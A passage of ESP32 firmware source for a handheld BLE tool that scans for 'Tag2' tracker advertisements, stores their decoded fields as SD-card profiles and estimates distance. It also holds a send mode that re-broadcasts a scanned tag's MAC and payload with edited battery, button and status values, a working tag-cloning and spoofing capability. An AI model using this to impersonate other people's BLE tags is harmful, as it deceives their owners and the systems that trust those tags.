  String k = "\"" + String(key) + "\"";
  int p = s.indexOf(k);
  if (p < 0) return false;
  p = s.indexOf(':', p + k.length());
  if (p < 0) return false;
  int i = p + 1;
  while (i < (int)s.length() && (s[i] == ' ' || s[i] == '\t')) i++;
  int j = i;
  while (j < (int)s.length() && (s[j] == '-' || (s[j] >= '0' && s[j] <= '9'))) j++;
  if (j <= i) return false;
  out = s.substring(i, j).toInt();
  return true;
}

static bool saveRfModelToSd() {
  if (!SD.exists("/config")) SD.mkdir("/config");
  if (!SD.exists(TAG2_CFG_DIR)) SD.mkdir(TAG2_CFG_DIR);
  if (SD.exists(TAG2_RF_CFG)) SD.remove(TAG2_RF_CFG);
  File f = SD.open(TAG2_RF_CFG, FILE_WRITE);
  if (!f) return false;
  f.printf("tx1m=%d\n", (int)distanceTxPowerAt1m);
  f.printf("n_x10=%u\n", (unsigned)distanceN_x10);
  f.close();
  return true;
}

static bool loadRfModelFromSd() {
  File f = SD.open(TAG2_RF_CFG, FILE_READ);
  if (!f) return false;
  int tx1m = (int)distanceTxPowerAt1m;
  int n10 = (int)distanceN_x10;
  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (!line.length()) continue;
    int eq = line.indexOf('=');
    if (eq <= 0) continue;
    String k = line.substring(0, eq);
    String v = line.substring(eq + 1);
    k.trim(); v.trim();
    if (k == "tx1m") tx1m = v.toInt();
    else if (k == "n_x10") n10 = v.toInt();
  }
  f.close();
  distanceTxPowerAt1m = (int8_t)constrain(tx1m, -100, -20);
  distanceN_x10 = (uint8_t)constrain(n10, 10, 40);
  return true;
}

static void captureBaselineFromCurrent() {
  baselineValid = true;
  baselineMac = selectedMac;
  baselineFastMode = advFastMode;
  baselineFastHours = fastHours;
  baselineSlowHours = slowHours;
  baselineConnAttempts = connAttempts;
  baselineButtonPresses = buttonPresses;
  baselineBatteryLevel = batteryLevel;
  baselineConnectionStateCode = connectionStateCode;
  baselineStatusFlags = statusFlags;
}

static void restoreBaseline() {
  if (!baselineValid) return;
  selectedMac = baselineMac;
  advFastMode = baselineFastMode;
  fastHours = baselineFastHours;
  slowHours = baselineSlowHours;
  connAttempts = baselineConnAttempts;
  buttonPresses = baselineButtonPresses;
  batteryLevel = baselineBatteryLevel;
  connectionStateCode = baselineConnectionStateCode;
  statusFlags = baselineStatusFlags;
  applySendToAdvertiser();
}

static bool saveCurrentSendConfigToSd() {
  Tag2Profile p;
  p.valid = true;
  p.manualSave = true;
  p.mac = selectedMac;
  p.mode = advFastMode;
  p.fast_h = fastHours;
  p.slow_h = slowHours;
  p.conn = connAttempts;
  p.btn = buttonPresses;
  p.batt = batteryLevel;
  p.state = connectionStateCode;
  p.flags = statusFlags;
  return saveProfileToSd(p, true);
}

static bool parseProfileFromJson(const String& all, Tag2Profile& p) {
  if (!all.startsWith("{")) return false;
  int v = 0;
  String mac;
  if (jsonGetString(all, "mac", mac)) p.mac = mac;
  if (jsonGetInt(all, "manual_save", v)) p.manualSave = (v != 0);
  if (jsonGetInt(all, "mode", v)) p.mode = (v != 0);
  if (jsonGetInt(all, "fast_h", v)) p.fast_h = (uint8_t)constrain(v, 0, 255);
  if (jsonGetInt(all, "slow_h", v)) p.slow_h = (uint16_t)constrain(v, 0, 65535);
  if (jsonGetInt(all, "conn", v)) p.conn = (uint8_t)constrain(v, 0, 255);
  if (jsonGetInt(all, "btn", v)) p.btn = (uint8_t)constrain(v, 0, 255);
  if (jsonGetInt(all, "batt", v)) p.batt = (uint8_t)constrain(v, 0, 100);
  if (jsonGetInt(all, "state", v)) p.state = (uint8_t)constrain(v, 0, 255);
  if (jsonGetInt(all, "flags", v)) p.flags = (uint16_t)constrain(v, 0, 65535);
  p.valid = p.mac.length() == 17;
  return p.valid;
}

static void applyProfile(const Tag2Profile& p) {
  if (!p.valid) return;
  selectedMac = p.mac;
  advFastMode = p.mode;
  fastHours = p.fast_h;
  slowHours = p.slow_h;
  connAttempts = p.conn;
  buttonPresses = p.btn;
  batteryLevel = p.batt;
  connectionStateCode = p.state;
  statusFlags = p.flags;
  applySendToAdvertiser();
}

static bool saveProfileToSd(const Tag2Profile& p, bool updateLastPath) {
  if (!p.valid || p.mac.length() != 17) return false;
  if (!SD.exists("/config")) SD.mkdir("/config");
  if (!SD.exists(TAG2_CFG_DIR)) SD.mkdir(TAG2_CFG_DIR);
  String cfgPath = macToCfgPath(p.mac);
  if (SD.exists(cfgPath)) SD.remove(cfgPath);
  File f = SD.open(cfgPath, FILE_WRITE);
  if (!f) return false;
  f.printf("{\"manual_save\":%s,\"mac\":\"%s\",\"mode\":%d,\"fast_h\":%u,\"slow_h\":%u,\"conn\":%u,\"btn\":%u,\"batt\":%u,\"state\":%u,\"flags\":%u}\n",
           p.manualSave ? "true" : "false",
           p.mac.c_str(),
           p.mode ? 1 : 0,
           (unsigned)p.fast_h,
           (unsigned)p.slow_h,
           (unsigned)p.conn,
           (unsigned)p.btn,
           (unsigned)p.batt,
           (unsigned)p.state,
           (unsigned)p.flags);
  f.close();

  if (updateLastPath) {
    if (SD.exists(TAG2_LAST_CFG)) SD.remove(TAG2_LAST_CFG);
    File lf = SD.open(TAG2_LAST_CFG, FILE_WRITE);
    if (!lf) return false;
    lf.println(cfgPath);
    lf.close();
  }
  return true;
}

static bool saveScanProfilesToSd() {
  bool ok = false;
  for (const auto& kv : lastScanProfiles) {
    Tag2Profile p = kv.second;
    p.manualSave = false;
    ok |= saveProfileToSd(p, false);
  }
  if (ok) {
    if (SD.exists(TAG2_SCAN_LAST_CFG)) SD.remove(TAG2_SCAN_LAST_CFG);
    File sf = SD.open(TAG2_SCAN_LAST_CFG, FILE_WRITE);
    if (sf) {
      sf.println("scan_dump");
      sf.close();
    }
  }
  return ok;
}

static bool loadConfigFromPath(const String& cfgPath) {
  File f = SD.open(cfgPath, FILE_READ);
  if (!f) return false;
  String all = f.readString();
  f.close();
  all.trim();

  if (all.startsWith("{")) {
    String mac;
    int v = 0;
    if (jsonGetString(all, "mac", mac)) selectedMac = mac;
    if (jsonGetInt(all, "mode", v)) advFastMode = (v != 0);
    if (jsonGetInt(all, "fast_h", v)) fastHours = (uint8_t)constrain(v, 0, 255);
    if (jsonGetInt(all, "slow_h", v)) slowHours = (uint16_t)constrain(v, 0, 65535);
    if (jsonGetInt(all, "conn", v)) connAttempts = (uint8_t)constrain(v, 0, 255);
    if (jsonGetInt(all, "btn", v)) buttonPresses = (uint8_t)constrain(v, 0, 255);
    if (jsonGetInt(all, "batt", v)) batteryLevel = (uint8_t)constrain(v, 0, 100);
    if (jsonGetInt(all, "state", v)) connectionStateCode = (uint8_t)constrain(v, 0, 255);
    if (jsonGetInt(all, "flags", v)) statusFlags = (uint16_t)constrain(v, 0, 65535);
  } else {
    // Backward compatibility for legacy key=value profiles.
    int start = 0;
    while (start < (int)all.length()) {
      int end = all.indexOf('\n', start);
      if (end < 0) end = all.length();
      String line = all.substring(start, end);
      line.trim();
      start = end + 1;
      if (!line.length()) continue;
      int eq = line.indexOf('=');
      if (eq <= 0) continue;
      String k = line.substring(0, eq);
      String vv = line.substring(eq + 1);
      k.trim();
      vv.trim();
      if (k == "mac") selectedMac = vv;
      else if (k == "mode") advFastMode = (vv.toInt() != 0);
      else if (k == "fast_h") fastHours = (uint8_t)constrain(vv.toInt(), 0, 255);
      else if (k == "slow_h") slowHours = (uint16_t)constrain(vv.toInt(), 0, 65535);
      else if (k == "conn") connAttempts = (uint8_t)constrain(vv.toInt(), 0, 255);
      else if (k == "btn") buttonPresses = (uint8_t)constrain(vv.toInt(), 0, 255);
      else if (k == "batt") batteryLevel = (uint8_t)constrain(vv.toInt(), 0, 100);
      else if (k == "state") connectionStateCode = (uint8_t)constrain(vv.toInt(), 0, 255);
      else if (k == "flags") statusFlags = (uint16_t)constrain(vv.toInt(), 0, 65535);
    }
  }
  applySendToAdvertiser();
  return true;
}

static bool loadLastSendConfigFromSd() {
  File lf = SD.open(TAG2_LAST_CFG, FILE_READ);
  if (!lf) return false;
  String cfgPath = lf.readStringUntil('\n');
  lf.close();
  cfgPath.trim();
  if (!cfgPath.length()) return false;
  return loadConfigFromPath(cfgPath);
}

static bool loadProfileForMac(const String& mac, bool requiredManualSave) {
  const String cfgPath = macToCfgPath(mac);
  File f = SD.open(cfgPath, FILE_READ);
  if (!f) return false;
  String all = f.readString();
  f.close();
  all.trim();
  Tag2Profile p;
  if (!parseProfileFromJson(all, p)) {
    return loadConfigFromPath(cfgPath);
  }
  if (p.manualSave != requiredManualSave) return false;
  applyProfile(p);
  return true;
}

static bool loadProfilesFromSdAsScan(bool requiredManualFalse) {
  File dir = SD.open(TAG2_CFG_DIR);
  if (!dir || !dir.isDirectory()) return false;

  lastScanProfiles.clear();
  bool foundPrimary = false;
  for (;;) {
    File f = dir.openNextFile();
    if (!f) break;
    if (f.isDirectory()) {
      f.close();
      continue;
    }
    String name = String(f.name());
    if (!name.endsWith(".cfg")) {
      f.close();
      continue;
    }
    String all = f.readString();
    f.close();
    all.trim();
    Tag2Profile p;
    if (!parseProfileFromJson(all, p)) continue;

    if (p.manualSave != !requiredManualFalse) continue;
    foundPrimary = true;
    lastScanProfiles[p.mac] = p;
  }
  dir.close();
  if (foundPrimary) return !lastScanProfiles.empty();

  // Fallback for SCAN load: if no scan profiles exist, accept manual profiles.
  File dir2 = SD.open(TAG2_CFG_DIR);
  if (!dir2 || !dir2.isDirectory()) return false;
  for (;;) {
    File f = dir2.openNextFile();
    if (!f) break;
    if (f.isDirectory()) {
      f.close();
      continue;
    }
    String name = String(f.name());
    if (!name.endsWith(".cfg")) {
      f.close();
      continue;
    }
    String all = f.readString();
    f.close();
    all.trim();
    Tag2Profile p;
    if (!parseProfileFromJson(all, p)) continue;
    if (!p.manualSave) continue;
    lastScanProfiles[p.mac] = p;
  }
  dir2.close();
  return !lastScanProfiles.empty();
}

static bool parseMacToBytes(const String& mac, uint8_t out[6]) {
  if (mac.length() != 17) return false;
  int vals[6];
  if (sscanf(mac.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
             &vals[0], &vals[1], &vals[2], &vals[3], &vals[4], &vals[5]) != 6) {
    return false;
  }
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)vals[i];
  return true;
}

static void buildTag2AdvRaw(uint8_t out[31], uint8_t& outLen) {
  memset(out, 0, 31);
  uint8_t p[10];
  p[0] = buttonPresses;
  p[1] = batteryLevel;
  p[2] = advFastMode ? 1 : 0;
  p[3] = fastHours;
  p[4] = (uint8_t)(slowHours >> 8);
  p[5] = (uint8_t)(slowHours & 0xFF);
  p[6] = connectionStateCode;
  p[7] = connAttempts;
  p[8] = (uint8_t)(statusFlags >> 8);
  p[9] = (uint8_t)(statusFlags & 0xFF);
  uint8_t i = 0;
  out[i++] = 0x02; out[i++] = 0x01; out[i++] = 0x06;
  out[i++] = 0x0D; out[i++] = 0xFF; out[i++] = 0x00; out[i++] = 0xFF;
  memcpy(out + i, p, 10); i += 10;
  const char* dn = "BLE Tag2";
  uint8_t n = (uint8_t)strlen(dn);
  out[i++] = (uint8_t)(n + 1);
  out[i++] = 0x09;
  memcpy(out + i, dn, n); i += n;
  outLen = i;
}

static void applySendToAdvertiser() {
  if (!tag2Adv) {
    tag2Adv = BLEDevice::getAdvertising();
  }

  tag2Adv->stop();
  delay(20);

  // BLE interval units are 0.625 ms:
  // FAST 200 ms => 320 (0x0140), SLOW 2000 ms => 3200 (0x0C80)
  const uint16_t advInterval = advFastMode ? 0x0140 : 0x0C80;
  tag2Adv->setMinInterval(advInterval);
  tag2Adv->setMaxInterval(advInterval);

  // Keep advertising scanner-friendly across tools/phones/sniffers.
  tag2Adv->setScanResponse(false);
  // NimBLE expects BLE_GAP_CONN_MODE_* (not Bluedroid ADV_TYPE_* values).
  tag2Adv->setAdvertisementType(BLE_GAP_CONN_MODE_NON);

  // Desired behavior: use custom static-random MAC selected in UI.
  // With NimBLE we must program the random identity via ble_hs_id_set_rnd().
  bool customRndOk = false;
  uint8_t macBytes[6];
  if (parseMacToBytes(selectedMac, macBytes)) {
    // Static-random: two MSBs of first octet must be 11.
    macBytes[0] = (uint8_t)((macBytes[0] & 0x3F) | 0xC0);
    NimBLEAddress rndAddr(macBytes, BLE_ADDR_RANDOM);
    int rc = ble_hs_id_set_rnd(rndAddr.getNative());
    customRndOk = (rc == 0);
    if (customRndOk) {
      BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM, false);
    }
    Serial.printf("[TAG2] ble_hs_id_set_rnd(%s) -> %d\n", selectedMac.c_str(), rc);
  }

  uint8_t raw[31], rawLen = 0;
  buildTag2AdvRaw(raw, rawLen);
  BLEAdvertisementData ad = BLEAdvertisementData();
  ad.addData(std::string((char*)raw, rawLen));
  tag2Adv->setAdvertisementData(ad);

  Serial.printf("[TAG2] ADV cfg mode=%s enabled=%d interval=0x%04X rawLen=%u ownAddr=%s\n",
                advFastMode ? "FAST" : "SLOW",
                advEnabled ? 1 : 0,
                advInterval,
                (unsigned)rawLen,
                customRndOk ? "RANDOM(custom)" : "RANDOM(failed)");

  if (advEnabled) {
    bool ok = tag2Adv->start();
    Serial.printf("[TAG2] ADV start returned=%d\n", ok ? 1 : 0);
  }
}

static void drawSendView() {
  drawHeaderActionIcons(true, true, true, true);
  tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(GREEN, TFT_BLACK);
  tft.setCursor(8, 50); tft.print("SEND MODE - TAG2");
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(8, 66); tft.print("TX MAC: "); tft.print(selectedMac);
  tft.setCursor(8, 80); tft.print("Mode: "); tft.print(advFastMode ? "FAST" : "SLOW");
  tft.print("  Batt:"); tft.print((int)batteryLevel);
  tft.print("  PW: "); tft.print(advEnabled ? "ON" : "OFF");

  const int y0 = 102;
  const int rowH = 22;
  const char* names[5] = {"FastH", "SlowH", "Conn", "Btn", "Batt"};
  int vals[5] = {fastHours, (int)slowHours, connAttempts, buttonPresses, batteryLevel};
  for (int i = 0; i < 5; i++) {
    int y = y0 + i * rowH;
    tft.setTextColor(i == selectedField ? ORANGE : WHITE, TFT_BLACK);
    tft.setCursor(8, y); tft.print(names[i]);
    tft.setCursor(70, y); tft.print(": ");
    tft.print(vals[i]);
    // Tiny per-field controls on the right of value: -, +, reset.
    drawButton(146, y - 2, 16, 14, "-", false, false);
    drawButton(164, y - 2, 16, 14, "+", false, false);
    if (i < 4) drawButton(186, y - 2, 16, 14, "0", false, false);
    if (i == 4) drawButton(204, y - 2, 18, 14, "M", false, false);
  }

  // Last row: BACK + MODE on left, PW ON/OFF on right.
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  drawButton(0, 304, 57, 16, "Back", false, false);
  drawButton(60, 304, 57, 16, "Mode", false, false);
  drawButton(177, 304, 57, 16, advEnabled ? "On" : "Off", false, false);
}

static void ensureBleInit() {
  if (bleInitDone) return;

  bleScan = BLEDevice::getScan();
  bleScan->setActiveScan(true);
  bleInitDone = true;
}

static void cacheProfilesFromCurrentResults() {
  const int n = filteredCount();
  for (int i = 0; i < n; i++) {
    BLEAdvertisedDevice d = filteredDevice(i);
    uint8_t p[10];
    if (!parseTag2Payload(d, p)) continue;
    Tag2Profile tp;
    tp.valid = true;
    tp.manualSave = false;
    tp.mac = String(d.getAddress().toString().c_str());
    tp.mode = p[2] ? true : false;
    tp.fast_h = p[3];
    tp.slow_h = ((uint16_t)p[4] << 8) | p[5];
    tp.state = p[6];
    tp.conn = p[7];
    tp.flags = ((uint16_t)p[8] << 8) | p[9];
    tp.btn = p[0];
    tp.batt = (uint8_t)constrain((int)p[1], 0, 100);
    lastScanProfiles[tp.mac] = tp;
  }
}

static void liveScanTask(void*) {
  ensureBleInit();
  while (liveScanRun) {
    isScanning = true;
    bleResults = bleScan->start(2, false);
    rebuildTag2Index();
    cacheProfilesFromCurrentResults();
    liveScanLastUpdateMs = millis();
    liveResultsVersion++;
    if (millis() >= uiHoldUntilMs) {
      // Ask UI to update only when user is on scan list.
      if (!isSendView && !isDetailView) {
        screenNeedsUpdate = true;
      }
    }
    if (liveScanStopReq) break;
    vTaskDelay(50 / portTICK_PERIOD_MS);
  }
  isScanning = false;
  liveScanRun = false;
  liveScanTaskHandle = nullptr;
  vTaskDelete(nullptr);
}

static void startLiveScan() {
  if (liveScanRun) return;
  liveScanStopReq = false;
  liveScanRun = true;
  xTaskCreatePinnedToCore(liveScanTask, "tag2LiveScan", 4096, nullptr, 1, &liveScanTaskHandle, 0);
}

static void stopLiveScan() {
  liveScanStopReq = true;
  if (bleScan) bleScan->stop();
  uint32_t t0 = millis();
  while (liveScanRun && (millis() - t0) < 1200) {
    delay(10);
  }
  isScanning = false;
}

void displayScanning() {
  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(GREEN);
  tft.setCursor(10, LIST_HEADER_Y);
  tft.println("Scanning...");
  tft.setCursor(10, LIST_HEADER_Y + 12);
  tft.println("Wait a moment.");
}

static void bgBleScanTask(void* ) {
  ensureBleInit();
  for (;;) {
    const uint32_t now = millis();
    if (bgBootMs == 0) bgBootMs = now;

    const bool idleOk = (now - bgBootMs) > BG_BOOT_GRACE_MS;
    if (settings().autoBleScan && idleOk && !feature_active && !in_sub_menu) {
      isScanning = true;

      bleResults = bleScan->start(2, false);
      rebuildTag2Index();
      isScanning = false;
      if (bleResults.getCount() >= 0) {
        bgHasResults = (filteredCount() > 0);
        bgLastScanMs = now;
      }
      vTaskDelay(BG_BLE_SCAN_INTERVAL_MS / portTICK_PERIOD_MS);
    } else {
      vTaskDelay(1000 / portTICK_PERIOD_MS);
    }
  }
}

void startBLEScan() {
  stopLiveScan();
  displayScanning();
  // Fresh scan session: drop all previous in-memory scan/profile data.
  lastScanProfiles.clear();
  loadedProfileList.clear();
  showingLoadedProfiles = false;
  tag2Indices.clear();
  isDetailView = false;
  current_page = 0;
  currentIndex = 0;
  listStartIndex = 0;
  screenNeedsUpdate = true;
  fullScreenUpdate = true;
  headerIconsDirty = true;
  ensureBleInit();
  isScanning = true;
  bleResults = bleScan->start(5, false);
  rebuildTag2Index();
  cacheProfilesFromCurrentResults();
  isScanning = false;
  screenNeedsUpdate = true;
}

void handleButtons() {
  unsigned long currentMillis = millis();
  if (currentMillis - lastButtonPress < debounceTime) return;

  int oldPage = current_page;

  if (!pcf.digitalRead(BTN_UP)) {
    if (!isDetailView && currentIndex > 0) {
      currentIndex--;
      delay(200);
      current_page = currentIndex / max(1, DEVICES_PER_PAGE);
      listStartIndex = current_page * DEVICES_PER_PAGE;
      screenNeedsUpdate = true;
      fullScreenUpdate = (current_page != oldPage);
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_DOWN)) {
    if (!isDetailView && currentIndex < filteredCount() - 1) {
      currentIndex++;
      delay(200);
      current_page = currentIndex / max(1, DEVICES_PER_PAGE);
      listStartIndex = current_page * DEVICES_PER_PAGE;
      screenNeedsUpdate = true;
      fullScreenUpdate = (current_page != oldPage);
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_RIGHT)) {
    delay(200);
    if (!isScanning) {
      isDetailView = !isDetailView;
      screenNeedsUpdate = true;
      fullScreenUpdate = true;
    }
    lastButtonPress = currentMillis;
  }

  if (!pcf.digitalRead(BTN_LEFT)) {
    delay(200);
    if (isDetailView) {
      isDetailView = false;
      fullScreenUpdate = true;
    } else if (!isScanning) {
      startBLEScan();
      fullScreenUpdate = true;
    }
    screenNeedsUpdate = true;
    lastButtonPress = currentMillis;
  }
}

void updateBLEList() {
  int deviceCount = filteredCount();
  tft.setTextSize(1);
  static uint32_t lastRenderedVersion = 0;

  if (deviceCount <= 0) {
    tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("No devices found.");
    tft.setCursor(10, LIST_HEADER_Y + 12);
    tft.println("Press Rescan.");
    drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int totalPages = (deviceCount + DEVICES_PER_PAGE - 1) / DEVICES_PER_PAGE;
  if (current_page < 0) current_page = 0;
  if (current_page > totalPages - 1) current_page = max(0, totalPages - 1);
  listStartIndex = current_page * DEVICES_PER_PAGE;

  static int last_rendered_page = -1;
  static int last_rendered_index = -1;

  auto drawRow = [&](int idx, bool selected) {
    if (idx < 0 || idx >= deviceCount) return;
    if (idx < listStartIndex || idx >= listStartIndex + DEVICES_PER_PAGE) return;
    const int row = idx - listStartIndex;
    const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;

    // Clear only this row (avoid overlapping next row).
    tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
    String rowTxt;
    if (showingLoadedProfiles) {
      Tag2Profile p = filteredProfile(idx);
      rowTxt = p.mac + " SD";
    } else {
      BLEAdvertisedDevice device = filteredDevice(idx);
      float dMeters = estimateDistanceMeters(device.getRSSI());
      rowTxt = "RSSI:" + String(device.getRSSI()) + " D:" + formatDistance(dMeters);
    }
    if (rowTxt.length() > 27) rowTxt = rowTxt.substring(0, 27);

    tft.setCursor(10, y);
    tft.setTextColor(selected ? ORANGE : WHITE);
    tft.print(selected ? "> " : "  ");
    tft.println(rowTxt);
  };

  const bool pageChanged = (current_page != last_rendered_page);
  const bool versionChanged = false;
  const bool needFull = fullScreenUpdate || pageChanged || (last_rendered_index < 0) || versionChanged;

  if (needFull) {
    tft.fillRect(0, 37, 240, 320 - 37, TFT_BLACK);
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("BLE Tag2:");

    if (!showingLoadedProfiles) {
      // Distance model setup row: [icon][-/+][value] for Tx and n.
      tft.drawBitmap(8, 61, bitmap_icon_antenna2, 16, 16, ORANGE);
      drawButton(24, 62, 16, 14, "-", false, false);
      drawButton(42, 62, 16, 14, "+", false, false);
      tft.setTextColor(WHITE, TFT_BLACK);
      tft.setCursor(60, 66);
      tft.print("Tx:");
      tft.print((int)distanceTxPowerAt1m);

      tft.drawBitmap(116, 61, bitmap_icon_graph_self_loop, 16, 16, ORANGE);
      drawButton(132, 62, 16, 14, "-", false, false);
      drawButton(150, 62, 16, 14, "+", false, false);
      tft.setCursor(170, 66);
      tft.print("n:");
      tft.print(((float)distanceN_x10) / 10.0f, 1);
    } else {
      tft.setTextColor(WHITE, TFT_BLACK);
      tft.setCursor(10, 66);
      tft.print("Loaded profiles");
    }

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, totalPages);
    tft.setCursor(180, LIST_HEADER_Y);
    tft.setTextColor(GREEN);
    tft.println(page_buf);

    const int end_index = min(listStartIndex + DEVICES_PER_PAGE, deviceCount);
    for (int i = listStartIndex; i < end_index; i++) {
      drawRow(i, (i == currentIndex));
    }

    const bool prevDisabled = (current_page == 0);
    const bool nextDisabled = ((current_page + 1) * DEVICES_PER_PAGE >= deviceCount);
    drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);

    last_rendered_page = current_page;
    last_rendered_index = currentIndex;
    lastRenderedVersion = liveResultsVersion;
    return;
  }

  if (last_rendered_index != currentIndex) {
    drawRow(last_rendered_index, false);
    drawRow(currentIndex, true);
    last_rendered_index = currentIndex;
  }
}

void displayBLEDetails() {

  tft.fillRect(0, 37, 240, 320, TFT_BLACK);
  tft.setTextSize(1);

  const int deviceCount = filteredCount();
  if (deviceCount <= 0) {
    isDetailView = false;
    screenNeedsUpdate = true;
    fullScreenUpdate = true;
    return;
  }
  if (currentIndex < 0) currentIndex = 0;
  if (currentIndex >= deviceCount) currentIndex = deviceCount - 1;

  if (showingLoadedProfiles) {
    Tag2Profile p = filteredProfile(currentIndex);
    hasSelectedTag2 = p.valid;
    if (!p.valid) return;
    selectedMac = p.mac;
    advFastMode = p.mode;
    fastHours = p.fast_h;
    slowHours = p.slow_h;
    connAttempts = p.conn;
    buttonPresses = p.btn;
    batteryLevel = p.batt;
    connectionStateCode = p.state;
    statusFlags = p.flags;
    captureBaselineFromCurrent();

    int y = 50;
    tft.setTextColor(WHITE, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(10, y); tft.print("Device: BLE Tag2 (SD)");
    y += 20;
    tft.setCursor(10, y); tft.print("MAC: " + p.mac);
    y += 20;
    tft.setCursor(10, y); tft.print("Mode: " + String(p.mode ? "FAST" : "SLOW"));
    y += 20;
    tft.setCursor(10, y); tft.print("FastH: " + String((int)p.fast_h));
    y += 20;
    tft.setCursor(10, y); tft.print("SlowH: " + String((int)p.slow_h));
    y += 20;
    tft.setCursor(10, y); tft.print("Conn: " + String((int)p.conn) + " Btn: " + String((int)p.btn));
    y += 20;
    tft.setCursor(10, y); tft.print("Batt: " + String((int)p.batt));
    drawTabBar("Back", false, "", true, "Use", !hasSelectedTag2);
    return;
  }

  BLEAdvertisedDevice device = filteredDevice(currentIndex);
  String deviceName = device.getName().length() > 0 ? device.getName().c_str() : "Unknown Device";
  String address = device.getAddress().toString().c_str();
  int rssi = device.getRSSI();
  int txPower = device.getTXPower();
  float dMeters = estimateDistanceMeters(rssi);

  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setTextSize(1);

  int y = 50;
  tft.setCursor(10, y);
  tft.print("Device: " + deviceName);
  y += 20;
  tft.setCursor(10, y);
  tft.print("MAC: " + address);
  y += 20;
  tft.setCursor(10, y);
  tft.print("RSSI: " + String(rssi) + " dBm");
  y += 20;
  tft.setCursor(10, y);
  tft.print("Tx Power: " + String(txPower) + " dBm");
  y += 20;
  tft.setCursor(10, y);
  tft.print("Dist: " + formatDistance(dMeters) + " (Tx@" + String((int)distanceTxPowerAt1m) + " n=" + String(((float)distanceN_x10) / 10.0f, 1) + ")");

  if (device.haveServiceUUID()) {
    y += 20;
    tft.setCursor(10, y);
    tft.print("Service UUID: " + String(device.getServiceUUID().toString().c_str()));
  } else {
    y += 20;
    tft.setCursor(10, y);
    tft.print("No Service UUID");
  }
  hasSelectedTag2 = false;
  if (device.haveManufacturerData()) {
    String manufacturerData = String((char*)device.getManufacturerData().c_str());
    y += 20;
    tft.setCursor(10, y);
    tft.print("Manufacturer: " + manufacturerData);
    uint8_t p[10];
    if (parseTag2Payload(device, p)) {
      hasSelectedTag2 = true;
      memcpy(selectedPayload, p, sizeof(selectedPayload));
      selectedMac = address;
      buttonPresses = p[0];
      batteryLevel = (uint8_t)constrain((int)p[1], 0, 100);
      fastHours = p[3];
      slowHours = ((uint16_t)p[4] << 8) | p[5];
      connectionStateCode = p[6];
      connAttempts = p[7];
      statusFlags = ((uint16_t)p[8] << 8) | p[9];
      advFastMode = p[2] ? true : false;
      captureBaselineFromCurrent();
    }
  } else {
    y += 20;
    tft.setCursor(10, y);
    tft.print("No Manufacturer Data");
  }
  if (device.haveServiceData()) {
    String serviceData = String((char*)device.getServiceData().c_str());
    y += 30;
    tft.setCursor(10, y);
    tft.print("Service Data: " + serviceData);
  } else {
    y += 30;
    tft.setCursor(10, y);
    tft.print("No Service Data");
  }

  drawTabBar("Back", false, "", true, "Use", !hasSelectedTag2);
}

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawLine(0, 19, 240, 19, WHITE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }
  const bool inLoadedScanView = (showingLoadedProfiles && !isSendView && !isDetailView);
  const bool saveEnabled = !inLoadedScanView;
  const bool loadEnabled = !inLoadedScanView;
  const bool showReset = isSendView;
  const bool resetEnabled = isSendView;
  static bool lastSaveEnabled = true;
  static bool lastLoadEnabled = true;
  static bool lastShowReset = false;
  static bool lastResetEnabled = false;
  if (saveEnabled != lastSaveEnabled || loadEnabled != lastLoadEnabled ||
      showReset != lastShowReset || resetEnabled != lastResetEnabled) {
    headerIconsDirty = true;
    lastSaveEnabled = saveEnabled;
    lastLoadEnabled = loadEnabled;
    lastShowReset = showReset;
    lastResetEnabled = resetEnabled;
  }
  if (headerIconsDirty || fullScreenUpdate) {
    tft.fillRect(40, STATUS_BAR_Y_OFFSET, 56, 16, DARK_GRAY);
    drawHeaderActionIcons(saveEnabled, loadEnabled, showReset, resetEnabled);
    headerIconsDirty = false;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          if (!isScanning) startBLEScan();
          break;
        case 1:
           stopLiveScan();
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 120;
  static uint32_t lastTouchActionMs = 0;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
  int x, y;
  if (feature_active && readTouchXY(x, y)) {
      const uint32_t nowMs = millis();
      if (nowMs - lastTouchActionMs < 250) {
        lastTouchCheck = millis();
        return;
      }
